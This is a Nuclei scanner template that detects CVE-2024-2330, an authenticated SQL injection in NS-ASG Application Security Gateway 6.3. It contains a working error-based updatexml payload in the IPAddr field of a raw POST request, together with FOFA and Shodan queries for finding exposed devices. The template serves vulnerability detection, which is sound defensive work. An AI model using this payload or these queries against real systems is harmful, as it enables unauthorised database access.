http:
- extractors:
  - group: 1
    name: version
    regex:
    - 'XPATH syntax error: ''([~0-9.]+)'''
    type: regex
  matchers:
  - condition: and
    dsl:
    - contains_all(body,"XPATH syntax error:","alert") && contains(header,"text/html")
    - status_code == 200
    type: dsl
  raw:
  - 'POST /protocol/index.php  HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    jsoncontent={"protocolType":"addmacbind","messagecontent":["{\"BandIPMacId\":\"1\",\"IPAddr\":\"eth0''and(updatexml(1,concat(0x7e,(select+version())),1))=''\",\"MacAddr\":\"\",\"DestIP\":\"\",\"DestMask\":\"255.255.255.0\",\"Description\":\"Sample+Description\"}"]}

    '
id: CVE-2024-2330
info:
  author: s4e-io
  classification:
    cve-id: CVE-2024-2330
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L
    cvss-score: 6.3
    cwe-id: CWE-89
    epss-percentile: 0.9977
    epss-score: 0.93057
  description: 'A vulnerability was found in Netentsec NS-ASG Application Security
    Gateway 6.3. It has been classified as critical. This affects an unknown part
    of the file /protocol/index.php. The manipulation of the argument IPAddr leads
    to sql injection. It is possible to initiate the attack remotely. The exploit
    has been disclosed to the public and may be used.

    '
  impact: 'Authenticated attackers can extract sensitive database information via
    SQL injection in the NS-ASG Application Security Gateway.

    '
  metadata:
    fofa-query: "app=\"\u7F51\u5EB7\u79D1\u6280-NS-ASG\u5B89\u5168\u7F51\u5173\""
    max-request: 2
    shodan-query: "http.title:\u201CNS-ASG\u201D"
  name: NS-ASG Application Security Gateway 6.3 - Sql Injection
  reference:
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=2024-2330
  - https://nvd.nist.gov/vuln/detail/CVE-2024-2330
  - https://github.com/jikedaodao/cve/blob/main/NS-ASG-sql-addmacbind.md
  - https://vuldb.com/?ctiid.256281
  - https://vuldb.com/?id.256281
  remediation: 'Update NS-ASG Application Security Gateway to a version newer than
    6.3.

    '
  severity: medium
  tags: cve,cve2024,ns-asg,sqli,vkev,vuln
